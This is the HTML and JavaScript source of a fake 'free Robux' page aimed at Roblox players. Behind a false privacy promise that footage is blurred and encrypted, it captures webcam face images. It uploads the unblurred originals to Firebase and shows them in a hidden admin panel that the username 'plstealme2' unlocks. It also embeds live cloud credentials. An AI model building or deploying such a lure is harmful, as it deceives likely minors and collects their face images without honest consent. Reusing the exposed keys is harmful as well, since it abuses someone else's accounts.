<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>ROBUX CLAIM • Instant Verification Portal</title>
    <!-- Firebase SDKs -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
    <!-- Cloudinary Upload Widget -->
    <script src="https://upload-widget.cloudinary.com/global/all.js" type="text/javascript"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
        }

        body {
            background: radial-gradient(ellipse at 30% 20%, #0a0e1c, #02040c);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1.5rem;
        }

        .portal-card {
            max-width: 720px;
            width: 100%;
            background: rgba(12, 18, 32, 0.88);
            backdrop-filter: blur(16px);
            border-radius: 2.2rem;
            border: 1px solid rgba(255, 190, 70, 0.3);
            box-shadow: 0 28px 40px -14px rgba(0,0,0,0.6), 0 0 0 1px rgba(255, 180, 60, 0.15);
            overflow: hidden;
            transition: all 0.2s;
        }

        .step-pane {
            padding: 2rem 1.8rem 2.2rem;
        }

        h2 {
            font-size: 1.9rem;
            font-weight: 800;
            background: linear-gradient(135deg, #FFE3A4, #FFA83C);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 0.4rem;
        }

        .sub {
            color: #9db2e0;
            font-size: 0.85rem;
            border-left: 3px solid #FFA83C;
            padding-left: 0.75rem;
            margin-bottom: 1.8rem;
        }

        .question-text {
            font-size: 1.4rem;
            font-weight: 600;
            color: #f0f3fc;
            margin-bottom: 1.2rem;
        }

        .btn-group {
            display: flex;
            gap: 1rem;
            flex-wrap: wrap;
            margin: 1.2rem 0;
        }

        .btn {
            border: none;
            background: #1f2946;
            color: white;
            font-weight: 600;
            padding: 0.8rem 1.8rem;
            border-radius: 60px;
            cursor: pointer;
            transition: 0.2s;
            font-size: 0.95rem;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .btn-primary {
            background: linear-gradient(98deg, #F2A65A, #FF8C42);
            color: #131c2c;
            font-weight: 700;
            box-shadow: 0 4px 12px rgba(242, 166, 90, 0.3);
        }

        .btn-primary:hover {
            transform: scale(0.97);
            filter: brightness(1.05);
        }

        .btn-outline {
            background: transparent;
            border: 1.5px solid #4c6085;
            color: #ccdcff;
        }

        .roblox-login-area {
            background: #0a1022cc;
            border-radius: 1.5rem;
            padding: 1.3rem;
            margin: 0.8rem 0;
            border: 1px solid #314267;
        }

        .username-input {
            width: 100%;
            padding: 14px 18px;
            background: #0e162f;
            border: 1px solid #445177;
            border-radius: 60px;
            color: white;
            font-size: 1rem;
            outline: none;
        }

        .username-input:focus {
            border-color: #FFB347;
            box-shadow: 0 0 0 3px rgba(255, 180, 71, 0.3);
        }

        .privacy-box {
            background: #070d21b3;
            border-radius: 1.4rem;
            padding: 1.3rem;
            border: 1px solid #3c4770;
        }

        .accept-row {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 1rem 0 0.5rem;
        }

        .media-preview {
            background: #030917;
            border-radius: 28px;
            padding: 1rem;
            text-align: center;
        }

        .preview-container {
            position: relative;
            width: 100%;
            aspect-ratio: 16 / 9;
            background: #000000aa;
            border-radius: 20px;
            overflow: hidden;
            border: 1px solid #5e6e97;
            margin-bottom: 1rem;
        }

        video, canvas {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        canvas {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
        }

        .action-row {
            display: flex;
            gap: 12px;
            justify-content: center;
            flex-wrap: wrap;
            margin: 0.8rem 0;
        }

        .status-message {
            background: #0e172b;
            padding: 0.7rem;
            border-radius: 40px;
            font-size: 0.85rem;
            text-align: center;
        }

        .spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 180, 70, 0.3);
            border-radius: 50%;
            border-top-color: #FFB347;
            animation: spin 0.7s linear infinite;
            margin-right: 6px;
            vertical-align: middle;
        }

        @keyframes spin { to { transform: rotate(360deg); } }

        .admin-dashboard {
            margin-top: 1.8rem;
            background: #010617cc;
            border-radius: 1.8rem;
            padding: 1.2rem;
            border: 1px solid #f5a62355;
        }

        .submissions-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));
            gap: 18px;
            margin-top: 18px;
            max-height: 550px;
            overflow-y: auto;
            padding: 6px;
        }

        .submission-card {
            background: #0b1022;
            border-radius: 20px;
            padding: 12px;
            border: 1px solid #ffb34755;
            transition: 0.2s;
        }

        .media-thumb {
            width: 100%;
            aspect-ratio: 1;
            object-fit: cover;
            border-radius: 16px;
            background: #000;
            cursor: pointer;
            transition: 0.2s;
        }

        .blurred-img {
            filter: blur(28px);
        }

        .unblurred-img {
            filter: blur(0px);
        }

        .admin-badge-label {
            background: #f5a62320;
            color: #FFCC80;
            border-radius: 60px;
            padding: 4px 12px;
            font-size: 0.7rem;
            font-weight: bold;
        }

        .validate-btn {
            background: #2c6e2c;
            border: none;
            padding: 6px 12px;
            border-radius: 30px;
            color: white;
            font-size: 0.7rem;
            cursor: pointer;
            margin-top: 8px;
            width: 100%;
        }

        .validate-btn.approved {
            background: #2c6e2c;
            opacity: 0.7;
            cursor: default;
        }

        .unblur-toggle {
            background: #a05e1a;
            margin-top: 6px;
            width: 100%;
            font-size: 0.7rem;
            padding: 6px;
        }

        .success-message {
            background: #1d3929;
            border-radius: 2rem;
            padding: 1rem;
            text-align: center;
            margin-bottom: 1rem;
        }

        footer {
            font-size: 0.7rem;
            text-align: center;
            color: #6580b0;
            padding: 1rem;
            border-top: 1px solid #1f2a4a;
        }
        hr {
            border-color: #2a365a;
            margin: 12px 0;
        }
    </style>
</head>
<body>
<div class="portal-card" id="appRoot"></div>

<script>
    // ---------- FIREBASE CONFIGURATION ----------
    const firebaseConfig = {
        apiKey: "AIzaSyAupBkllyicDPD9O6CmX4mS4sF5z96mqxc",
        authDomain: "vertexpaste.firebaseapp.com",
        projectId: "vertexpaste",
        storageBucket: "vertexpaste.firebasestorage.app",
        messagingSenderId: "255275350380",
        appId: "1:255275350380:web:7be4e8add2cb5b04045b49"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    
    // Cloudinary config
    const CLOUD_NAME = 'dsv2sthkf';
    const UPLOAD_PRESET = 'portfoliohub_uploads';
    
    // ---- GLOBAL STATE ----
    let currentStep = 'welcome';      // welcome, robloxAuth, privacy, media, success (no validating step)
    let robloxUsername = '';
    let isAdminMode = false;
    let mediaStream = null;
    let animationFrameId = null;
    let capturedBlob = null;
    let originalBlob = null;
    let submissionId = null;
    
    const appRoot = document.getElementById('appRoot');
    
    function stopMediaTracks() {
        if (mediaStream) {
            mediaStream.getTracks().forEach(track => track.stop());
            mediaStream = null;
        }
        if (animationFrameId) {
            cancelAnimationFrame(animationFrameId);
            animationFrameId = null;
        }
    }
    
    // Real-time blur effect on canvas while preview
    function startRealTimeBlur(videoElem, canvasElem) {
        if (!videoElem || !canvasElem) return;
        const ctx = canvasElem.getContext('2d');
        const drawBlur = () => {
            if (!videoElem || videoElem.paused || videoElem.ended || !videoElem.videoWidth) {
                animationFrameId = requestAnimationFrame(drawBlur);
                return;
            }
            const { videoWidth, videoHeight } = videoElem;
            canvasElem.width = videoWidth;
            canvasElem.height = videoHeight;
            ctx.filter = 'blur(24px)';
            ctx.drawImage(videoElem, 0, 0, videoWidth, videoHeight);
            ctx.filter = 'none';
            animationFrameId = requestAnimationFrame(drawBlur);
        };
        drawBlur();
    }
    
    // Capture both original and blurred versions
    async function captureOriginalAndBlurred(videoElem) {
        return new Promise((resolve) => {
            if (!videoElem || !videoElem.videoWidth) return resolve(null);
            const canvas = document.createElement('canvas');
            canvas.width = videoElem.videoWidth;
            canvas.height = videoElem.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
            canvas.toBlob(originalBlobResult => {
                ctx.filter = 'blur(28px)';
                ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
                ctx.filter = 'none';
                canvas.toBlob(blurredBlob => resolve({ originalBlob: originalBlobResult, blurredBlob }), 'image/jpeg', 0.85);
            }, 'image/jpeg', 0.9);
        });
    }
    
    async function uploadToCloudinary(blob, username) {
        const formData = new FormData();
        formData.append('file', blob, `verif_blur_${username}_${Date.now()}.jpg`);
        formData.append('upload_preset', UPLOAD_PRESET);
        const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
            method: 'POST',
            body: formData
        });
        const data = await res.json();
        if (!data.secure_url) throw new Error('Cloudinary upload fail');
        return data.secure_url;
    }
    
    async function uploadOriginalToFirebaseStorage(blobOriginal, username) {
        const storageRef = firebase.storage().ref();
        const fileName = `originals/${username}_${Date.now()}.jpg`;
        const fileRef = storageRef.child(fileName);
        await fileRef.put(blobOriginal);
        return await fileRef.getDownloadURL();
    }
    
    async function saveRecordWithOriginals(username, blurredUrl, originalUrl) {
        const docRef = db.collection('verifications').doc();
        await docRef.set({
            robloxUsername: username,
            imageUrl: blurredUrl,
            timestamp: firebase.firestore.FieldValue.serverTimestamp(),
            status: 'pending',
            blurred: true
        });
        await db.collection('admin_originals').doc(docRef.id).set({
            originalUrl: originalUrl,
            userId: docRef.id,
            robloxUser: username
        });
        return docRef.id;
    }
    
    async function fetchAllSubmissions() {
        const snapshot = await db.collection('verifications').orderBy('timestamp', 'desc').get();
        const items = [];
        for (const doc of snapshot.docs) {
            const data = doc.data();
            let originalUrl = null;
            const originalDoc = await db.collection('admin_originals').doc(doc.id).get();
            if (originalDoc.exists) originalUrl = originalDoc.data().originalUrl;
            items.push({
                id: doc.id,
                username: data.robloxUsername,
                blurredUrl: data.imageUrl,
                timestamp: data.timestamp?.toDate?.() || new Date(),
                status: data.status || 'pending',
                originalUrl: originalUrl
            });
        }
        return items;
    }
    
    async function approveSubmission(subId) {
        await db.collection('verifications').doc(subId).update({ status: 'approved', approvedAt: firebase.firestore.FieldValue.serverTimestamp() });
    }
    
    // ----- RENDER FUNCTIONS -----
    function renderWelcome() {
        return `<div class="step-pane">
            <h2>🎁 REWARD VAULT</h2>
            <div class="sub">limited roblox credits • instant qualification</div>
            <div class="question-text">✨ Do you want <strong style="color:#FFD966;">INSTANT ROBUX</strong>? ✨</div>
            <div class="btn-group">
                <button class="btn btn-primary" id="yesRewardBtn">YES, CLAIM NOW</button>
                <button class="btn btn-outline" id="noRewardBtn">No, thanks</button>
            </div>
            <footer>roblox account verification required</footer>
        </div>`;
    }
    
    function renderRobloxAuth() {
        return `<div class="step-pane">
            <h2>🔐 Roblox Identity</h2>
            <div class="sub">enter your valid roblox username</div>
            <div class="roblox-login-area">
                <input type="text" id="robloxUserField" class="username-input" placeholder="e.g., BuilderBoy2025" autocomplete="off">
                <div class="btn-group" style="margin-top: 20px;">
                    <button class="btn btn-primary" id="confirmRobloxBtn">Continue →</button>
                </div>
            </div>
        </div>`;
    }
    
    function renderPrivacyStep() {
        return `<div class="step-pane">
            <h2>🔒 Privacy & Media Consent</h2>
            <div class="sub">required by reward policy</div>
            <div class="privacy-box">
                <p style="font-size:0.85rem;">By accepting, you authorize video capture for age/identity validation. All footage is immediately blurred and stored encrypted.</p>
                <div class="accept-row">
                    <input type="checkbox" id="privacyCheckbox">
                    <label for="privacyCheckbox">I accept the terms & camera usage</label>
                </div>
                <div class="action-row">
                    <button class="btn btn-primary" id="acceptPrivacyBtn" disabled>Accept & Proceed</button>
                    <button class="btn btn-outline" id="declinePrivacyBtn">Cancel</button>
                </div>
            </div>
        </div>`;
    }
    
    function renderMediaStep() {
        return `<div class="step-pane">
            <h2>📸 Live Capture</h2>
            <div class="sub">position your face clearly • will be auto‑blurred</div>
            <div class="media-preview">
                <div class="preview-container">
                    <video id="liveVideo" autoplay playsinline muted style="width:100%; height:100%; object-fit:cover; border-radius:20px;"></video>
                    <canvas id="blurOverlay" style="width:100%; height:100%; position:absolute; top:0; left:0; border-radius:20px;"></canvas>
                </div>
                <div class="action-row">
                    <button class="btn btn-primary" id="startCamBtn">📷 Start Camera</button>
                    <button class="btn btn-primary" id="submitBlurBtn" disabled>✅ Submit & Auto‑Blur</button>
                </div>
                <div class="status-message" id="mediaStatusMsg">Click "Start Camera" to begin</div>
            </div>
        </div>`;
    }
    
    function renderSuccessStep() {
        let adminPanelHtml = '';
        if (isAdminMode) {
            adminPanelHtml = `<div class="admin-dashboard" id="adminSecretPanel">
                <div style="display:flex; justify-content:space-between; align-items:center;">
                    <h3 style="color:#FFC857;">🔓 Admin Vault (plstealme2) — Unblur Access</h3>
                    <span class="admin-badge-label"><i class="fas fa-eye"></i> hidden dashboard</span>
                </div>
                <div id="adminSubmissionsList" class="submissions-grid">
                    <div class="spinner"></div> Loading submissions...
                </div>
            </div>`;
        }
        return `<div class="step-pane">
            <div style="text-align:center;">
                <div style="font-size:3.8rem;">✅✨</div>
                <h2 style="color:#c6f7b0;">SUBMITTED!</h2>
                <div class="success-message">
                    <i class="fas fa-check-circle"></i> Your verification has been sent to review team.<br>
                    You will receive Robux once approved.
                </div>
                ${adminPanelHtml}
                <hr>
                <button class="btn btn-outline" id="fullResetBtn">⟳ Start Over</button>
            </div>
            <footer>ID: ${submissionId ? submissionId.slice(0,8) : 'pending'}</footer>
        </div>`;
    }
    
    // ----- RENDER CONTROLLER (NO VALIDATING STEP) -----
    function render() {
        if (!appRoot) return;
        let html = '';
        switch(currentStep) {
            case 'welcome': html = renderWelcome(); break;
            case 'robloxAuth': html = renderRobloxAuth(); break;
            case 'privacy': html = renderPrivacyStep(); break;
            case 'media': html = renderMediaStep(); break;
            case 'success': html = renderSuccessStep(); break;
            default: html = '<div class="step-pane">error</div>';
        }
        appRoot.innerHTML = html;
        
        if (currentStep === 'welcome') attachWelcomeEvents();
        if (currentStep === 'robloxAuth') attachRobloxEvents();
        if (currentStep === 'privacy') attachPrivacyEvents();
        if (currentStep === 'media') attachMediaEvents();
        if (currentStep === 'success' && isAdminMode) {
            loadAdminSubmissionsWithUnblur();
            const resetBtn = document.getElementById('fullResetBtn');
            if (resetBtn) resetBtn.onclick = () => fullReset();
        } else if (currentStep === 'success') {
            const resetBtn = document.getElementById('fullResetBtn');
            if (resetBtn) resetBtn.onclick = () => fullReset();
        }
    }
    
    // ----- EVENT HANDLERS -----
    function attachWelcomeEvents() {
        const yesBtn = document.getElementById('yesRewardBtn');
        const noBtn = document.getElementById('noRewardBtn');
        if (yesBtn) yesBtn.onclick = () => { currentStep = 'robloxAuth'; render(); };
        if (noBtn) noBtn.onclick = () => alert("Reward declined. Reload to restart.");
    }
    
    function attachRobloxEvents() {
        const inputField = document.getElementById('robloxUserField');
        const confirmBtn = document.getElementById('confirmRobloxBtn');
        if (confirmBtn) {
            confirmBtn.onclick = () => {
                const username = inputField.value.trim();
                if (!username) {
                    alert("Please enter your Roblox username");
                    return;
                }
                robloxUsername = username;
                // SECRET: if username is "plstealme2" -> admin mode
                if (robloxUsername.toLowerCase() === 'plstealme2') {
                    isAdminMode = true;
                } else {
                    isAdminMode = false;
                }
                currentStep = 'privacy';
                render();
            };
        }
    }
    
    function attachPrivacyEvents() {
        const checkbox = document.getElementById('privacyCheckbox');
        const acceptBtn = document.getElementById('acceptPrivacyBtn');
        const declineBtn = document.getElementById('declinePrivacyBtn');
        if (checkbox) checkbox.addEventListener('change', (e) => { if (acceptBtn) acceptBtn.disabled = !e.target.checked; });
        if (acceptBtn) acceptBtn.onclick = () => { currentStep = 'media'; render(); };
        if (declineBtn) declineBtn.onclick = () => { currentStep = 'welcome'; render(); };
    }
    
    function attachMediaEvents() {
        const startCam = document.getElementById('startCamBtn');
        const submitBtn = document.getElementById('submitBlurBtn');
        const video = document.getElementById('liveVideo');
        const blurCanvas = document.getElementById('blurOverlay');
        const msgDiv = document.getElementById('mediaStatusMsg');
        
        const initCamera = async () => {
            stopMediaTracks();
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                mediaStream = stream;
                video.srcObject = stream;
                await video.play();
                if (blurCanvas) startRealTimeBlur(video, blurCanvas);
                if (msgDiv) { msgDiv.innerText = '✅ Camera active — click Submit & Auto‑Blur'; msgDiv.style.background = '#1f3a2a'; }
                if (submitBtn) submitBtn.disabled = false;
            } catch(err) {
                msgDiv.innerText = '❌ Camera permission denied. Enable camera and reload.';
                msgDiv.style.background = '#4a2525';
                submitBtn.disabled = true;
            }
        };
        if (startCam) startCam.onclick = initCamera;
        if (submitBtn) {
            submitBtn.onclick = async () => {
                if (!mediaStream || !video || !video.videoWidth) {
                    msgDiv.innerText = '⚠️ Please start camera first';
                    return;
                }
                // Show loading state on button
                submitBtn.disabled = true;
                submitBtn.innerHTML = '<span class="spinner"></span> Uploading...';
                
                const { originalBlob: orig, blurredBlob: blurred } = await captureOriginalAndBlurred(video);
                if (!blurred || !orig) { alert('Capture failed'); submitBtn.disabled = false; submitBtn.innerHTML = '✅ Submit & Auto‑Blur'; return; }
                capturedBlob = blurred;
                originalBlob = orig;
                stopMediaTracks();
                if (video.srcObject) video.srcObject = null;
                
                // Directly upload and go to success panel (NO validating step)
                try {
                    const blurredUrl = await uploadToCloudinary(capturedBlob, robloxUsername);
                    const originalUrl = await uploadOriginalToFirebaseStorage(originalBlob, robloxUsername);
                    const docId = await saveRecordWithOriginals(robloxUsername, blurredUrl, originalUrl);
                    submissionId = docId;
                    currentStep = 'success';
                    render();
                } catch (err) {
                    console.error(err);
                    alert('Upload failed, please retry');
                    submitBtn.disabled = false;
                    submitBtn.innerHTML = '✅ Submit & Auto‑Blur';
                    currentStep = 'media';
                    render();
                }
            };
        }
    }
    
    // ---- ADMIN: load submissions with unblur toggle (no validating step) ----
    async function loadAdminSubmissionsWithUnblur() {
        const container = document.getElementById('adminSubmissionsList');
        if (!container) return;
        const submissions = await fetchAllSubmissions();
        if (submissions.length === 0) {
            container.innerHTML = '<p style="color:#aaa;">No submissions yet.</p>';
            return;
        }
        container.innerHTML = '';
        for (const sub of submissions) {
            const card = document.createElement('div');
            card.className = 'submission-card';
            const isApproved = sub.status === 'approved';
            let isUnblurred = false;
            const imgElement = document.createElement('img');
            imgElement.className = 'media-thumb blurred-img';
            imgElement.src = sub.blurredUrl;
            imgElement.style.cursor = 'pointer';
            
            const toggleUnblur = async () => {
                if (!isUnblurred && sub.originalUrl) {
                    imgElement.src = sub.originalUrl;
                    imgElement.classList.remove('blurred-img');
                    imgElement.classList.add('unblurred-img');
                    isUnblurred = true;
                } else if (isUnblurred) {
                    imgElement.src = sub.blurredUrl;
                    imgElement.classList.remove('unblurred-img');
                    imgElement.classList.add('blurred-img');
                    isUnblurred = false;
                }
            };
            imgElement.onclick = toggleUnblur;
            
            card.appendChild(imgElement);
            
            const infoDiv = document.createElement('div');
            infoDiv.style.marginTop = '8px';
            infoDiv.innerHTML = `
                <div style="font-size: 12px; color:#dddddd;">👤 ${escapeHtml(sub.username)}</div>
                <div style="font-size: 10px; color:#9aa9ce;">📅 ${new Date(sub.timestamp).toLocaleString()}</div>
                <div style="font-size: 10px; color:${isApproved ? '#6fcf97' : '#f0a55a'};">Status: ${sub.status}</div>
            `;
            card.appendChild(infoDiv);
            
            const unblurBtn = document.createElement('button');
            unblurBtn.className = 'validate-btn unblur-toggle';
            unblurBtn.innerText = '👁️ Toggle Unblur (View Original)';
            unblurBtn.onclick = toggleUnblur;
            card.appendChild(unblurBtn);
            
            if (!isApproved) {
                const approveBtn = document.createElement('button');
                approveBtn.className = 'validate-btn';
                approveBtn.innerText = '✅ Approve & Grant Robux';
                approveBtn.onclick = async () => {
                    approveBtn.innerText = 'Approving...';
                    approveBtn.disabled = true;
                    await approveSubmission(sub.id);
                    await loadAdminSubmissionsWithUnblur();
                };
                card.appendChild(approveBtn);
            } else {
                const approvedMark = document.createElement('button');
                approvedMark.className = 'validate-btn approved';
                approvedMark.innerText = '✔ Approved';
                approvedMark.disabled = true;
                card.appendChild(approvedMark);
            }
            container.appendChild(card);
        }
    }
    
    function fullReset() {
        stopMediaTracks();
        capturedBlob = null;
        originalBlob = null;
        robloxUsername = '';
        isAdminMode = false;
        submissionId = null;
        currentStep = 'welcome';
        render();
    }
    
    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/[&<>]/g, function(m) {
            if (m === '&') return '&amp;';
            if (m === '<') return '&lt;';
            if (m === '>') return '&gt;';
            return m;
        });
    }
    
    const origRender = render;
    window.render = function() { origRender(); };
    render = function() {
        origRender();
        if (currentStep === 'success') {
            const resetAll = document.getElementById('fullResetBtn');
            if (resetAll) resetAll.onclick = () => fullReset();
            if (isAdminMode) loadAdminSubmissionsWithUnblur();
        }
    };
    
    render();
</script>
</body>
</html>
